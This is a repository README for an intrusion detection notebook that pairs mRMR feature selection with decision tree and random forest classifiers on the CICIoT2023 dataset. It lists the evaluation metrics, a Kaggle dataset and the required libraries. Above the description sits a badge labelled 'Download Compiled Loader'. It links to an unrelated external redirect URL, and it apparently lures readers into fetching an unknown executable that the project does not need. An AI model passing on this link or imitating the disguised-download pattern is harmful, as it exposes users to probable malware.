# Hybrid IDS with mRMR Feature Selection

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

This repository contains the experimental notebook related to a hybrid Intrusion Detection System (IDS) approach based on statistical feature selection and machine learning.

## Description

The project evaluates the impact of mRMR-based feature selection methods on intrusion detection performance using the CICIoT2023 dataset. The experiments compare standard machine learning classifiers with hybrid configurations that combine feature selection and classification models.

The evaluated models include:

- Decision Tree (DT)
- Decision Tree with mRMR-MID
- Decision Tree with mRMR-MIQ
- Random Forest (RF)
- Random Forest with mRMR-MID
- Random Forest with mRMR-MIQ
- Random Forest with mRMR-RFCQ

## Evaluation Metrics

The models are evaluated using the following metrics:

- Detection Rate (DR)
- False Positive Rate (FPR)
- Accuracy (ACC)

## Dataset

The experiments are based on a processed version of the CICIoT2023 dataset.

The processed dataset used in this project is available on Kaggle:

[Processed CICIoT2023 Dataset](https://www.kaggle.com/datasets/hamzaaitbaha/processed-data2?select=Processed_Data2)

The dataset files are not included in this repository due to their size. The data paths should be updated in the notebook according to the local or Kaggle environment.

## Requirements

The main Python libraries used in this project are:

- pandas
- numpy
- scikit-learn
- matplotlib
- feature-engine


